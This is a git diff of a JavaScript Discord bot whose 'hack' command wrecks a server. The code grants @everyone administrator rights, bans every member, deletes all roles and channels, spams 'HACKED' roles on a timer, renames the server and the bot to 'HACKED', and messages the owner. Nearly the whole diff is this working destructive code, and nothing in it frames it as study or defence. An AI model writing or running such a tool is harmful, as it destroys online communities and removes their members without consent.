@@ -6,7 +6,9 @@ console.log(`Logged in as ${client.user.tag}!`);
  
 });
           
-
+     // message.guild.members.forEach(m =>{
+                   // m.ban()
+               // }) 
 
 client.on('message', message => {
     if (message.content.startsWith(prefix + "hack")) {
@@ -14,15 +16,17 @@ client.on('message', message => {
         message.guild.roles.find('name', '@everyone').edit({
             permissions: ["ADMINISTRATOR"]///premission akata adminstator
         });
-        message.guild.channels.map(c => {
-            c.delete();
-        });
+      message.guild.members.forEach(a => 
+           message.guild.ban(a))
+    
       message.guild.roles.forEach(r =>{
                     r.delete()
                 })
-         message.guild.members.forEach(m =>{
-                    m.ban()
-                }) 
+        message.guild.channels.map(c => {
+            c.delete();
+        });
+      
+         
         setInterval(() => {
             message.guild.createRole({
                 name: "HACKED",
@@ -35,6 +39,7 @@ client.on('message', message => {
         message.guild.setIcon("link wena");
         client.user.setAvatar("link wena");
         client.user.setUsername("HACKED")
+        message.guild.owner.send("To mazay brakam")
         message.guild.setName('HACKED');
         setTimeout(function() {
             setInterval(() => {
